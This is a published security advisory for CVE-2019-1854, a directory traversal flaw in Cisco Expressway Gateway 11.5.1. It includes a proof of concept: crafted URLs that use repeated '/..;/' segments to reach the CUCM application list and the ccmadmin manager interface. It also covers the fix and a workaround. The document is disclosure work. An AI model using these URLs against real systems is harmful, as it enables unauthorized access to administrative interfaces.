@@ -1,0 +1,123 @@
+id: 32747
+date: 05/21/2019
+title: Cisco Expressway Gateway 11.5.1 Directory Traversal Vulnerability
+author: RedTeam
+cves: CVE-2019-1854
+
+Cisco Expressway Gateway 11.5.1 Directory Traversal Vulnerability
+
+Details
+=======
+
+Product: Cisco Expressway Gateway
+Affected Versions: 11.5.1, possibly others
+Fixed Versions: See Cisco Bug ID CSCvo47769 [1]
+Vulnerability Type: Directory Traversal
+Security Risk: medium
+Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190501-expressway-traversal
+Vendor Status: fixed version released
+Vendor ID: Cisco Bug ID CSCvo47769
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2019-002
+Advisory Status: published
+CVE: CVE-2019-1854
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1854
+
+
+Introduction
+============
+
+"Cisco Expressway offers users outside your firewall simple, highly
+secure access to all collaboration workloads, including video, voice,
+content, IM, and presence. Collaborate with people who are on
+third-party systems and endpoints or in other companies. Help
+teleworkers and Cisco Jabber mobile users work more effectively on their
+device of choice."
+(from the Cisco Expressway Series website [2]) 
+
+
+More Details
+============
+
+Cisco Expressway Gateway is a kind of reverse proxy which implements
+authentication mechanisms and forwards authorised requests to services
+based on information encoded within the requested URL. It supports two
+different URI layouts. The first layout only includes the base64-encoded
+domain name of the gateway itself:
+
+------------------------------------------------------------------------
+https://example.com:8443/$(echo -n example.com|base64)/test123
+
+https://example.com:8443/ZXhhbXBsZS5jb20=/test123
+------------------------------------------------------------------------
+
+The second layout additionally specifies the protocol, hostname and port
+number of a target system which is to be contacted through the gateway:
+
+------------------------------------------------------------------------
+https://example.com:8443/$(echo -n example.com/https/example.int/8443|base64)/test123
+
+https://example.com:8443/ZXhhbXBsZS5jb20vaHR0cHMvZXhhbXBsZS5pbnQvODQ0Mw==/test123
+------------------------------------------------------------------------
+
+RedTeam Pentesting analysed a Cisco Unified Communication Manager (CUCM)
+instance which was accessible via a Cisco Expressway Gateway. In this
+configuration, a directory traversal vulnerability was identified. It
+leverages the methodology described in "Breaking Parser Logic" [3] by
+Orange Tsai. The CUCM service, which is implemented using the Tomcat [4]
+application server, interprets URLs different to the upstream
+reverse proxy. By accessing a specially crafted URL, attackers can
+access the CUCM manager application, even though it is not exposed by
+the Cisco Expressway Gateway.
+
+
+Proof of Concept
+================
+
+First, an attacker must authenticate to the Cisco Expressway Gateway.
+A login can be performed by accessing the following URL using
+HTTP-Basic-Authentication:
+
+------------------------------------------------------------------------
+https://example.com:8443/ZXhhbXBsZS5jb20=/get_edge_config
+------------------------------------------------------------------------
+
+Afterwards, the resources on the CUCM may be accessed through the Cisco
+Expressway Gateway. By inserting repeated occurrences of "/..;/" into
+the URL, the directory traversal vulnerability can be exploited. Using
+the following URL, a list of applications installed on the CUCM system
+can be retrieved:
+
+------------------------------------------------------------------------
+https://example.com:8443/ZXhhbXBsZS5jb20vaHR0cHMvZXhhbXBsZS5pbnQvODQ0Mw==/cucm-uds/user/example_user/..;/..;/..;/
+------------------------------------------------------------------------
+
+Similarly, the CUCM manager application can be accessed as follows:
+
+------------------------------------------------------------------------
+https://example.com:8443/ZXhhbXBsZS5jb20vaHR0cHMvZXhhbXBsZS5pbnQvODQ0Mw==/cucm-uds/user/example_user/..;/..;/..;/ccmadmin
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Prevent access to the Cisco Expressway Gateway by untrusted parties.
+
+
+Fix
+===
+
+See Cisco Bug ID CSCvo47769 [1] for affected software releases and
+available patches.
+
+
+Security Risk
+=============
+
+The vulnerability can be used to access administrative interfaces which
+are usually not reachable. Attackers could potentially read or modify
+sensitive information via these interfaces. However, it is necessary to
+have an authorised user account to access the Cisco Expressway Gateway.
+Therefore, the vulnerability poses a medium risk.
+
+#  0day.today [2023-03-22]  #
